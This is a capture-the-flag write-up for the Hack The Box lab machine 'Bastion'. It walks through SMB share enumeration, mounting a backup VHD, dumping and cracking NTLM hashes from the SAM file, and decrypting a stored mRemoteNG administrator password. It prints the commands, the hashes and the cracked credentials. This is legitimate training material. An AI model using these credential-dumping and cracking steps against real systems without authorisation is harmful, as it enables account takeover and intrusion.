![Pasted image 20230727121827](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/678d2cb0-a49c-4b85-8908-16058160e7e1)


# Enumeration
nmap scan:
```
Nmap scan report for 10.129.136.29
Host is up (0.066s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a56ae753c780ec8564dcb1c22bf458a (RSA)
|   256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA)
|_  256 935f5daaca9f53e7f282e664a8a3a018 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-07-27T16:20:51
|_  start_date: 2023-07-27T16:19:17
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: -39m58s, deviation: 1h09m15s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-27T18:20:52+02:00

```
No web page which is somewhat unusual... 

22 - We have a windows ssh server which is also odd, but not unheard of. 
There's also a bunch of windows rpc stuff and some SMB. I'll do some digging into SMB first as those tend to be a good place to start. 


SMB:
```
$ smbclient -L 10.129.136.29
Password for [WORKGROUP\htb-th1stle]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available

```
There's a folder that is available called `Backups` which looks could bear fruit. 

# Foothold

```
smbclient //10.129.136.29/Backups
Password for [WORKGROUP\htb-th1stle]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Apr 16 11:02:11 2019
  ..                                  D        0  Tue Apr 16 11:02:11 2019
  note.txt                           AR      116  Tue Apr 16 11:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 12:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 12:44:02 2019

		5638911 blocks of size 4096. 1178147 blocks available
smb: \>
```
We can see several files. I grabbed everything here, but they weren't interesting. Now we dig deeper into the backups:
```
smb: \WindowsImageBackup\L4mpje-PC\> dir
  .                                  Dn        0  Fri Feb 22 12:45:32 2019
  ..                                 Dn        0  Fri Feb 22 12:45:32 2019
  Backup 2019-02-22 124351           Dn        0  Fri Feb 22 12:45:32 2019
  Catalog                            Dn        0  Fri Feb 22 12:45:32 2019
  MediaId                            An       16  Fri Feb 22 12:44:02 2019
  SPPMetadataCache                   Dn        0  Fri Feb 22 12:45:32 2019

		5638911 blocks of size 4096. 1178147 blocks available
```
I found a PC name file in there with a few folders. Again, the backup one looks good:
```
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                  Dn        0  Fri Feb 22 12:45:32 2019
  ..                                 Dn        0  Fri Feb 22 12:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 12:44:02 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 12:44:03 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 12:45:32 2019

		5638911 blocks of size 4096. 1178147 blocks available

```
At the top are some .vhd files which can contain useful info. I'll grab them with `get` and then mount them locally... 
After getting the vhd files, I need to install a program to mount the vhd file. 
Normally I would use the `get` command, but for some reason this messes things up and I can't use a guest mount tool. I was able to mount the share to /mnt/bastion with the following command:
```bash
sudo mount -t cifs //10.129.136.29/backups /mnt/bastion/
```
From there I navigated to the .vhd file I wanted and then  mounted that to a directory called /mnt/crack
```bash
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/crack/
```

> (This takes a minute it is a big file...)

Then I needed to be in a root shell and navigate into the backup. Since VHD files are backups of windows images, I might be able to get credentials:
```
┌─[root@htb-wmkqkfhdab]─[/mnt/crack/Windows/System32/config]
└──╼ #ls -la
total 74740
drwxrwxrwx 1 root root    12288 Feb 22  2019 .
drwxrwxrwx 1 root root   655360 Feb 22  2019 ..
-rwxrwxrwx 2 root root    28672 Feb 22  2019 BCD-Template
-rwxrwxrwx 2 root root    25600 Feb 22  2019 BCD-Template.LOG
-rwxrwxrwx 2 root root 30932992 Feb 22  2019 COMPONENTS
-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.0.regtrans-ms
-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.1.regtrans-ms
-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.2.regtrans-ms
-rwxrwxrwx 2 root root    65536 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.blf
-rwxrwxrwx 2 root root    65536 Feb 22  2019 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TM.blf
-rwxrwxrwx 2 root root   524288 Feb 22  2019 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms
-rwxrwxrwx 2 root root   524288 Jul 14  2009 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms
-rwxrwxrwx 2 root root     1024 Apr 12  2011 COMPONENTS.LOG
-rwxrwxrwx 2 root root   262144 Feb 22  2019 COMPONENTS.LOG1
-rwxrwxrwx 2 root root        0 Jul 14  2009 COMPONENTS.LOG2
-rwxrwxrwx 1 root root   262144 Feb 22  2019 DEFAULT
-rwxrwxrwx 1 root root     1024 Apr 12  2011 DEFAULT.LOG
-rwxrwxrwx 2 root root    91136 Feb 22  2019 DEFAULT.LOG1
-rwxrwxrwx 2 root root        0 Jul 14  2009 DEFAULT.LOG2
drwxrwxrwx 1 root root        0 Jul 14  2009 Journal
drwxrwxrwx 1 root root        0 Feb 22  2019 RegBack
-rwxrwxrwx 1 root root   262144 Feb 22  2019 SAM
-rwxrwxrwx 1 root root     1024 Apr 12  2011 SAM.LOG
-rwxrwxrwx 2 root root    21504 Feb 22  2019 SAM.LOG1
-rwxrwxrwx 2 root root        0 Jul 14  2009 SAM.LOG2
-rwxrwxrwx 1 root root   262144 Feb 22  2019 SECURITY
-rwxrwxrwx 1 root root     1024 Apr 12  2011 SECURITY.LOG
-rwxrwxrwx 2 root root    21504 Feb 22  2019 SECURITY.LOG1
-rwxrwxrwx 2 root root        0 Jul 14  2009 SECURITY.LOG2
-rwxrwxrwx 1 root root 24117248 Feb 22  2019 SOFTWARE
-rwxrwxrwx 1 root root     1024 Apr 12  2011 SOFTWARE.LOG
-rwxrwxrwx 2 root root   262144 Feb 22  2019 SOFTWARE.LOG1
-rwxrwxrwx 2 root root        0 Jul 14  2009 SOFTWARE.LOG2
-rwxrwxrwx 1 root root  9699328 Feb 22  2019 SYSTEM
-rwxrwxrwx 1 root root     1024 Apr 12  2011 SYSTEM.LOG
-rwxrwxrwx 2 root root   262144 Feb 22  2019 SYSTEM.LOG1
-rwxrwxrwx 2 root root        0 Jul 14  2009 SYSTEM.LOG2
drwxrwxrwx 1 root root     4096 Nov 20  2010 systemprofile
drwxrwxrwx 1 root root     4096 Feb 22  2019 TxR     
```
Lots of stuff, but the SAM files are there which is great. Now I can run a command to read hashes from the SAM file. It will need the SYSTEM and SAM file since one encrypts the other. :
```
#samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
Cool. That's the user hash! I can now get a login for them!
Since this is a windows machine, we can be pretty safe in assuming this is an NTLM hash, but checking doesn't hurt. 
From there, we run hashcat to crack it:
```
$ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt 

... SNIP ...
26112010952d963c8dc4217daec986d9:bureaulampje    
  
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 26112010952d963c8dc4217daec986d9


```
So now I have the credentials:
```
L4mpje
bureulampje
```

Since the SSH port was open, I can probably just use that. 

```
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                                                                                                                                
exxxxxxxxxxxxxxxxxxxxxxxxxxxxxx4
l4mpje@BASTION C:\Users\L4mpje\Desktop> 
```
We now have a quick way of accessing a user shell!

# Escalation

Quick note, I'm not sure if significant, but the IPv6 for the box is interresting:
```
Ethernet adapter Ethernet0:                                                                                               

   Connection-specific DNS Suffix  . : .htb                                                                               
   IPv6 Address. . . . . . . . . . . : dead:beef::81                                                                      
   IPv6 Address. . . . . . . . . . . : dead:beef::8d2b:6a36:d578:891b                                                     
   Link-local IPv6 Address . . . . . : fe80::8d2b:6a36:d578:891b%4                                                        
   IPv4 Address. . . . . . . . . . . : 10.129.136.29                                                                      
   Subnet Mask . . . . . . . . . . . : 255.255.0.0                                                                        
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%4                                                         
                                       10.129.0.1  
```

Looking through the installed programs, there is something interesting here:

![Pasted image 20230728151054](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/e1cb4434-5aa8-4e42-a395-ae698ff789e0)

Not sure what it is, but it's something different. 
Researching the program reveals that it stores configuration data in the appdata directory. Navigating to that directory gives me the following files:
![Pasted image 20230728151450](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/f75e9c12-3bd6-4395-aba2-f5eb3983ac38)

Slight hay stack, but I believe confCons.xml is what I want. If not, I'll start digging on the backups. No big deal, just time consuming. 
I managed to find the following information:
```
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" 
Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lW
WA10dQKiw==" Hostname="127.0.0.1" 
```
Cool. That's a hash. Looks base64 encoded... which is true, but it's encoded in other ways too. 

There is a tool online for this on github: https://github.com/haseebT/mRemoteNG-Decrypt

Using it I'm able to crack it:
```
$ python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```
Can I ssh with this?
```
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

administrator@BASTION C:\Users\Administrator>whoami                                                                             
bastion\administrator                                                                                                           

administrator@BASTION C:\Users\Administrator>cd Desktop                                                                         

administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                                                                                                                                              
5xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx4
administrator@BASTION C:\Users\Administrator\Desktop>
```
Bastion is completed. 
